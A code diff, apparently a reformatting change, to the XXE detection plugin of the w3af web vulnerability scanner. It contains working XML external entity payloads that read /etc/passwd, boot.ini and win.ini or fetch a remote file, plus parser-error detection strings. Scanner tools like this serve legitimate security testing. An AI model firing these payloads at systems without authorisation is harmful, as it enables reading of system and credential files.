@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import itertools
 
 from lxml import etree
@@ -40,36 +41,33 @@ class xxe(AuditPlugin):
 
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
+
     WINDOWS_FILES = [
-        '%SYSTEMDRIVE%\\boot.ini',
-        '%WINDIR%\\win.ini',
+        "%SYSTEMDRIVE%\\boot.ini",
+        "%WINDIR%\\win.ini",
     ]
 
     LINUX_FILES = [
-        '/etc/passwd',
+        "/etc/passwd",
     ]
 
-    REMOTE_FILES = [
-        'http://w3af.org/xxe.txt'
-    ]
+    REMOTE_FILES = ["http://w3af.org/xxe.txt"]
 
     # This is the only content stored in the https://w3af.org/xxe.txt file
-    REMOTE_SUCCESS = '667067323'
+    REMOTE_SUCCESS = "667067323"
 
     ENTITY_DEF = '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]>'
-    ENTITY = '&xxe_test;'
+    ENTITY = "&xxe_test;"
 
     GENERIC_PAYLOADS = [
         # This is the most effective payload I've found until now, tested using
         # libxml (python wrapper, but should apply to all libxml versions).
         '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>',
-
         '<?xml version="1.0" encoding="ISO-8859-1"?>'
         '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>',
-
         '<?xml version="1.0" encoding="ISO-8859-1"?>'
         '<!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "%s">]>'
-        '<foo>&xxe_test;</foo>',
+        "<foo>&xxe_test;</foo>",
     ]
 
     LINUX_PAYLOADS = [
@@ -83,48 +81,43 @@ class xxe(AuditPlugin):
 
     XML_PARSER_ERRORS = [
         # PHP
-        'xmlParseEntityDecl',
-        'simplexml_load_string',
-        'xmlParseInternalSubset',
-        'DOCTYPE improperly terminated',
-        'Start tag expected',
-        'No declaration for attribute',
-        'No declaration for element',
-
+        "xmlParseEntityDecl",
+        "simplexml_load_string",
+        "xmlParseInternalSubset",
+        "DOCTYPE improperly terminated",
+        "Start tag expected",
+        "No declaration for attribute",
+        "No declaration for element",
         # libxml and python
-        'failed to load external entity',
-        'Start tag expected',
-        'Invalid URI: file:///',
-        'Malformed declaration expecting version',
-        'Unicode strings with encoding',
-
+        "failed to load external entity",
+        "Start tag expected",
+        "Invalid URI: file:///",
+        "Malformed declaration expecting version",
+        "Unicode strings with encoding",
         # java
-        'must be well-formed',
-        'Content is not allowed in prolog',
-        'org.xml.sax',
-        'SAXParseException',
-        'com.sun.org.apache.xerces',
-
+        "must be well-formed",
+        "Content is not allowed in prolog",
+        "org.xml.sax",
+        "SAXParseException",
+        "com.sun.org.apache.xerces",
         # ruby
-        'ParseError',
-        'nokogiri',
-        'REXML',
-
+        "ParseError",
+        "nokogiri",
+        "REXML",
         # golang
-        'XML syntax error on line',
-        'Error unmarshaling XML',
-        'conflicts with field',
-        'illegal character code'
-        
+        "XML syntax error on line",
+        "Error unmarshaling XML",
+        "conflicts with field",
+        "illegal character code"
         # .NET
-        'XML Parsing Error',
-        'SyntaxError',
-        'no root element',
-        'not well-formed',
+        "XML Parsing Error",
+        "SyntaxError",
+        "no root element",
+        "not well-formed",
     ]
 
     MAX_XML_PARAM_MUTANTS = 5
-    TOKEN_XXE = '__TOKEN_XXE1__'
+    TOKEN_XXE = "__TOKEN_XXE1__"
 
     file_pattern_multi_in = MultiIn(FILE_PATTERNS)
     parser_errors_multi_in = MultiIn(XML_PARSER_ERRORS)
@@ -143,10 +136,10 @@ class xxe(AuditPlugin):
         if not param_value:
             return True
 
-        if 'xml' in param_name.lower():
+        if "xml" in param_name.lower():
             return True
 
-        if '<' in param_value and '>' in param_value:
+        if "<" in param_value and ">" in param_value:
             return True
 
         return False
@@ -162,9 +155,9 @@ class xxe(AuditPlugin):
         # First we send the generic tests, which don't take the original value
         # into account and are likely to work on some cases
         #
-        for file_name in itertools.chain(self.WINDOWS_FILES,
-                                         self.LINUX_FILES,
-                                         self.REMOTE_FILES):
+        for file_name in itertools.chain(
+            self.WINDOWS_FILES, self.LINUX_FILES, self.REMOTE_FILES
+        ):
             for payload in self.GENERIC_PAYLOADS:
                 yield payload % file_name
 
@@ -212,8 +205,7 @@ class xxe(AuditPlugin):
             tag_orig = tag.text
             tag.text = self.TOKEN_XXE
 
-            for file_name in itertools.chain(self.WINDOWS_FILES,
-                                             self.LINUX_FILES):
+            for file_name in itertools.chain(self.WINDOWS_FILES, self.LINUX_FILES):
                 dtd = self.ENTITY_DEF % file_name
                 xml_body = etree.tostring(xml_root).replace(self.TOKEN_XXE, self.ENTITY)
                 yield dtd + xml_body
@@ -243,22 +235,26 @@ class xxe(AuditPlugin):
         try:
             original_value_str = smart_str_ignore(original_value)
         except Exception as e:
-            msg = ('Failed to encode unicode original value to string'
-                   ' in _parse_xml(). Exception: "%s"')
+            msg = (
+                "Failed to encode unicode original value to string"
+                ' in _parse_xml(). Exception: "%s"'
+            )
             om.out.debug(msg % e)
             return None
 
         # Secure, don't introduce XXE in our XXE detection plugin ;-)
-        parser = etree.XMLParser(load_dtd=False,
-                                 no_network=True,
-                                 resolve_entities=False)
+        parser = etree.XMLParser(
+            load_dtd=False, no_network=True, resolve_entities=False
+        )
 
         try:
             xml_root = etree.fromstring(original_value_str, parser=parser)
         except Exception as e:
-            msg = ('Failed to parse "%s..." as XML to inject XXE tests.'
-                   ' The parameter name where injection failed was "%s".'
-                   ' Exception: "%s"')
+            msg = (
+                'Failed to parse "%s..." as XML to inject XXE tests.'
+                ' The parameter name where injection failed was "%s".'
+                ' Exception: "%s"'
+            )
             args = (original_value[:25], param_name, e)
             om.out.debug(msg % args)
             return None
@@ -292,12 +288,14 @@ class xxe(AuditPlugin):
         :param debugging_id: A unique identifier for this call to audit()
         """
         # Create some fake mutants to check the fuzzable request original value
-        mutants = create_mutants(freq, [''], orig_resp=orig_response)
+        mutants = create_mutants(freq, [""], orig_resp=orig_response)
 
-        self._send_mutants_in_threads(self._uri_opener.send_mutant,
-                                      self._injectable_mutants_iterator(freq, mutants),
-                                      self._analyze_result,
-                                      debugging_id=debugging_id)
+        self._send_mutants_in_threads(
+            self._uri_opener.send_mutant,
+            self._injectable_mutants_iterator(freq, mutants),
+            self._analyze_result,
+            debugging_id=debugging_id,
+        )
 
     def _analyze_result(self, mutant, response):
         """
@@ -317,15 +315,21 @@ class xxe(AuditPlugin):
                 return
 
             # Create the vulnerability!
-            desc = 'An XML External Entity injection was found at: %s'
+            desc = "An XML External Entity injection was found at: %s"
             desc %= mutant.found_at()
 
-            v = Vuln.from_mutant('XML External Entity', desc, severity.HIGH,
-                                 response.id, self.get_name(), mutant)
+            v = Vuln.from_mutant(
+                "XML External Entity",
+                desc,
+                severity.HIGH,
+                response.id,
+                self.get_name(),
+                mutant,
+            )
 
             v.add_to_highlight(pattern_match)
 
-            self.kb_append_uniq(self, 'xxe', v)
+            self.kb_append_uniq(self, "xxe", v)
             return
 
         # We get here when there are no vulnerabilities in the response
@@ -340,20 +344,28 @@ class xxe(AuditPlugin):
                 return
 
             # Do not report the same error twice
-            if self._has_bug(mutant, kb_varname='errors'):
+            if self._has_bug(mutant, kb_varname="errors"):
                 return
 
-            desc = ('An XML library parsing error was found at: %s. These'
-                    ' errors usually indicate that an XML injection is'
-                    ' possible.')
+            desc = (
+                "An XML library parsing error was found at: %s. These"
+                " errors usually indicate that an XML injection is"
+                " possible."
+            )
             desc %= mutant.found_at()
 
-            v = Vuln.from_mutant('XML Parsing Error', desc, severity.LOW,
-                                 response.id, self.get_name(), mutant)
+            v = Vuln.from_mutant(
+                "XML Parsing Error",
+                desc,
+                severity.LOW,
+                response.id,
+                self.get_name(),
+                mutant,
+            )
 
             v.add_to_highlight(parser_error)
 
-            self.kb_append_uniq(self, 'errors', v)
+            self.kb_append_uniq(self, "errors", v)
             return
 
     def _find_patterns(self, body):
